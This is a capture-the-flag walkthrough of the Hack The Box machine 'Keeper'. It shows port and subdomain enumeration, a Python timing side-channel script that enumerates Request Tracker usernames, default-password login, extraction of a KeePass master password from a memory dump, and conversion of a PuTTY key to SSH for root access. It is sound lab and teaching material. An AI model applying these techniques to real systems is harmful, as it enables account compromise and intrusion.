![keeper.png](keeper.png)

# Keeper

## Enum

```
nmap -Pn -sC -sV 10.10.11.227 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-14 19:51 IST
Nmap scan report for 10.10.11.227
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```
```bash
nmap -Pn -p- 10.10.11.227 -oN scans/nmap.allports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-14 20:28 IST
Nmap scan report for tickets.keeper.htb (10.10.11.227)
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.96 seconds
```
```bash
curl -i http://10.10.11.227
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 14 Aug 2023 18:51:59 GMT
Content-Type: text/html
Content-Length: 149
Last-Modified: Wed, 24 May 2023 14:04:44 GMT
Connection: keep-alive
ETag: "646e197c-95"
Accept-Ranges: bytes

<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
```
```bash
curl -I http://tickets.keeper.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: RT_SID_tickets.keeper.htb.80=e109010be5f40cc76fe51ad8cd372f60; path=/rt; HttpOnly
Date: Mon, 14 Aug 2023 18:54:37 GMT
Cache-control: no-cache
Pragma: no-cache
X-Frame-Options: DENY
```
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u "http://keeper.htb" \
  -H "Host: FUZZ.keeper.htb" -mc all -fs 149

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://keeper.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.keeper.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 149
________________________________________________

[Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 46ms]
    * FUZZ: tickets

:: Progress: [19966/19966] :: Job [1/1] :: 1234 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

So that's running `Best Practical` `Request Tracker` version `4.4.4`
![tracker.png](tracker.png)  

[https://www.cvedetails.com/vulnerability-list/vendor_id-8416/product_id-14710/Bestpractical-Request-Tracker.html](https://www.cvedetails.com/vulnerability-list/vendor_id-8416/product_id-14710/Bestpractical-Request-Tracker.html)  
```
CVE-2021-38562
Best Practical Request Tracker (RT) 4.2 before 4.2.17, 4.4 before 4.4.5, and 5.0 before 5.0.2 allows sensitive information disclosure via a timing attack against lib/RT/REST2/Middleware/Auth.pm.
```
[https://docs.bestpractical.com/release-notes/rt/4.4.5](https://docs.bestpractical.com/release-notes/rt/4.4.5)

This one was fixed at 4.4.5, and most of the other one are already fixed in 4.4.4, or don't seem super useful.


## Side channel attack

Searching for `timing attack` on [ippsec.rocks](http://ippsec.rocks) I found [this](https://www.youtube.com/watch?v=hmtnxLUqRhQ&t=1680s) video demonstrating how to do a time based side channel attacks in python. So I wrote this script, taking inspiration from that
```python
import requests


def check_user(username):

    url = "http://tickets.keeper.htb/rt/NoAuth/Login.html"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "RT_SID_tickets.keeper.htb.80="
        "33ea3d15db846fcd0ac8006b0eb5e7c7"
    }
    payload = f"user={username}&pass=asdf"

    res = requests.post(url, headers=headers, data=payload)

    return res.elapsed.microseconds


if __name__ == "__main__":
    with open(
        "/usr/share/seclists/Usernames/"
        "cirt-default-usernames.txt",
        #"top-usernames-shortlist.txt",
        "r"
    ) as f:
        usernames = f.read()
    usernames = usernames.split("\n")

    for user in usernames:
        user = user.lower()
        time = check_user(user)
        if time > 400000:
            print(f"{time} - \x1b[32m{user}\x1b[0m")
```
```bash
python3 side-channel.py
516635 - root
522913 - root
406899 - root
```

Now that I know the root is a valid user, I just tried a few passwords, and just `password` worked
And a few seconds of poking around the portal later, we find the lnorgaard unix username and passwor


## Privesc with a KeePass CVE

```bash
lnorgaard@keeper:~$ sudo -l
[sudo] password for lnorgaard:
Sorry, user lnorgaard may not run sudo on keeper.
```
```bash
grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
lnorgaard:x:1000:1000:lnorgaard,,,:/home/lnorgaard:/bin/bash
```
```bash
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```
```bash
lnorgaard@keeper:~$ ls -la
total 85384
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Aug 15 01:00 .
drwxr-xr-x 3 root      root          4096 May 24 16:09 ..
lrwxrwxrwx 1 root      root             9 May 24 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23 14:43 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23 14:43 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24 16:09 .cache
-rw------- 1 lnorgaard lnorgaard       20 Aug 15 00:12 .lesshst
-rw------- 1 lnorgaard lnorgaard      807 May 23 14:43 .profile
-rw-r--r-- 1 root      root      87391651 Aug 15 01:00 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24 10:25 .ssh
-rw-r----- 1 root      lnorgaard       33 Aug 14 23:43 user.txt
-rw-r--r-- 1 root      root            39 Jul 20 19:03 .vimrc
```

I'm scp-ing that zip over to my machine, once extracted theres a `kdbx`, which is a keepass database.
```bash
ls -la
total 247480
drwxr-xr-x 3 blnkn blnkn      4096 Aug 15 00:01 .
drwxr-xr-x 6 blnkn blnkn      4096 Aug 15 00:01 ..
-rwxr-x--- 1 blnkn blnkn 253395188 Aug 14 22:41 KeePassDumpFull.dmp
-rwxr-x--- 1 blnkn blnkn      3630 Aug 14 22:40 passcodes.kdbx
drwxr-xr-x 2 blnkn blnkn      4096 Aug 14 22:44 zip
```

Trying to crack that in the background, but didn't get any luck
```bash
keepass2john passcodes.kdbx > hash.txt
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```

Looking through the dmp file with strings, there are a lot of windows reference, and googling around a little, there's a CVE where it's possible to extract a keepass password from a memory dump.  

Tried the original PoC in dotnet, but the password didn't seem to make any sense to me, so I tried another implementation of the tool in python, and yea, same result, so I'm googling around some more about those words, and it quickly started to make sense, this is so Danish food stuff... haha.
```
python3 poc.py ~/sec/htb/machines/keeper/loot/zip/KeePassDumpFull.dmp
2023-08-14 23:21:32,532 [.] [main] Opened /home/blnkn/sec/htb/machines/keeper/loot/zip/KeePassDumpFull.dmp
Possible password: ●,d**************
Possible password: ●ld**************
Possible password: ●`d**************
Possible password: ●-d**************
Possible password: ●'d**************
Possible password: ●]d**************
Possible password: ●Ad**************
Possible password: ●Id**************
Possible password: ●:d**************
Possible password: ●=d**************
Possible password: ●_d**************
Possible password: ●cd**************
Possible password: ●Md**************
```
```bash
sudo apt-get install kpcli
```
```bash
kpcli --kdb=passcodes.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

Exploring the db we find a Putty key pretty quickly
```bash
kpcli:/passcodes/Network> show -f 0

 Path: /passcodes/Network/
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4********
  URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AA**************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************
       Private-Lines: 14
       AA**************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ****************************************************************
       ************************************************
       Private-MAC: b0a0************************************************************
```

Looking through stack overflow to find out that this is a `ppk` which is the ssh key format of Putty, so we presumably just have to transform that into an openssh pem and we're good to go.  
Found this tool called `puttygen` which can be install as part of `putty-tools` 
```bash
sudo apt-get install putty-tools
```

Tried to go from pem to ppk first with some test key that I generated
```
ssh-keygen -f test
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in test
Your public key has been saved in test.pub
The key fingerprint is:
SHA256:3L8/04t6lC0AXf7f92Jre2iFL0xUksdPrmzuVcHb93k blnkn@Kolossus
The key's randomart image is:
+---[RSA 3072]----+
|          . .. o |
|         . .. + =|
|          .  . O.|
|       . . .  o *|
|        S . .oo=+|
|           . +*.O|
|            o=.*E|
|             o&.B|
|           .+B=Xo|
+----[SHA256]-----+
```

```bash
puttygen test -o test.ppk
```

And yea it looks exactly like what we got 
```bash
cat test.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: blnkn@Kolossus
Public-Lines: 9
AAAAB3NzaC1yc2EAAAADAQABAAABgQCl9+8kaKs4/kioPaFTU78I2Qsw9xHWylYb
Hzo7RmUB+6eCZRUuzkoGfgt+Rc9DBeN57HJR4RpzarMe6pTRqD+QiUvnL4boyPQu
wqLLhnjg8swaG8vw5DftiC0qL34WzkfFYoplvbr5crbUIbnWh9oL+F8elSyFDNEi
CZXQ5DfHoXoH2VOsZ0P+cxZ3Apgjeszhe3OQtndTSBtfxFGgP2indJOlVLfK7Ru3
uraQgeIBWAf+OJ30qq8X9RiAYQ5uDYRNXHRc76fC3ewOTUaeQp2Q2RKFlcVBFGPj
X/KW+sGqLFEulHy+PgMvOsjJQlQDotX3YercuE8xuYxpvZBy6MN0qVDKGgiwrD0w
HluAAjgSXizIglY6XuuhSkUN+sF0Ifp+dJrT/0kZmoUZEH0pYpzYUBwdylm28a1Z
B4P9dIlFSUAkyMwG8vb8DGIswb9Ek8Vi178Zrevf5tkCd0wjIHYEzOoQBCFlnffD
+zNOtl8PynShryvTEW96GJOWPCDF6YE=
Private-Lines: 21
AAABgAqDb68vQDVuijy6FreYFQBi+14BMKyaCaVTL5Wkqm5bOiu86oAaCj9qCaFY
m74Dp/rHuyArscjA6BLbykyTq18lC11cOeASJsG1i6l33b1mM/6tZxhd5JsT5sSG
2KZqL8q1qM20HJ2DokhC0Kph1bKva5sc2QKeorrUv5xJcK0hMgFAR5givIBoWvJ0
BB4vP75C2zm+DUYFydIhtggALEl7TYUKHlBo/7n+RmVWDPKH2I3GmV7v1wKeAIzV
WRwol/AifPTb+2PoVJsHwLLm+mJg4dxDrnGUy3KQLITsOZQT4S8qlGuh112IeHlz
CIAnaJ1hTVd8tbm6selt494EYDfiOVDwJlK/gbBqiz/cL6nid1L7XM83h85w75FL
RzGkX+U3Z4sRwJVPYe8ZXlHLb4OTvnpoVrfv5KaZAnuzY06w8ObECbQm54+5AR4C
k0bbji1no+MUoeMBesYkFfceSHYqXqXCNS6Ve7zjZ7arVAEOn2BNPjmyVz1IZoXH
dtG1XwAAAMEA52KbhNzEteRYrCLP/MH35BXXCrQXrP4RfTyx/J+gc+vyAW11kEjr
n3Ac37bfjIE0GbCZU7rt7+GGNJZdVCVYveSZCbfo/CcWW8hczzNnlymqZsLsixca
pxZViS3TXS5fBfeW1uSC0LTnU6fuTffa2VOiQvGhxRI6MssILSBCiODIfGonVHMu
eyTT1SlqX7KxzDWKQ24PZM00ZXH6ps29mJ3uRvOf+51+pzCEHoG9EgcWIkQj6aK0
zAoayHdiZm/fAAAAwQC3n8+yPxW+5OLwbzxo+eSFEKsNhF3sMOXBRTGNBXpMZD6N
lFKssUrIId1XXmGdhem31fbe2rYceub3iB4w2MzGdzF3lyuFLBywvbwxAyKdLJp3
CpBX6W/7HOdFui9OA4Oxgm0RCOnMtPKvKOT+BqBjXC0C+HfL+SCseEsOGBdfbv+F
x5kfm5SqrZnvJ4eWHPs7wF+Go7Kx1esOvRpIil4eQAOzjXD+S2/usFEFp5CMG5WR
mgxi4GleIXn+wwLPUp8AAADAdZvHx+LFZ7wHC0PcBdCqoX4NnvZ+qogcdGPg4NKR
bCWfI0b0I+cdp4rFVeV8ZshsCnhQLYRSkxubEmmFtKDcL2MvDHN4+IKqqtFseIEB
8U0rE1c85K8lquU+h/rWT4tp8uKN04YpEUVLxjv1k3vUMmeGVSGAu+Juwj2Is643
PaxlmxRaFCiCBwL1fpvL2z5z44K7vzmjUE1+F/GjqCG2pro+xlcoEuQbq5XLDppc
BGpj6b/cE/hMZQWSFg+m1bSO
Private-MAC: 72ae0c890cd9bbef6995546741ee2f2cf2bba0536a55fc09aaf40c63e4de3041
```

Translating the real one from ppk to pem
```bash
puttygen priv.ppk -O private-openssh -o priv.pem
```

Noice
```bash
ssh -i priv.pem root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug 15 01:12:12 2023 from 10.10.14.118
root@keeper:~#
root@keeper:~#
root@keeper:~#
root@keeper:~#
root@keeper:~#
root@keeper:~#
root@keeper:~#
root@keeper:~#
```
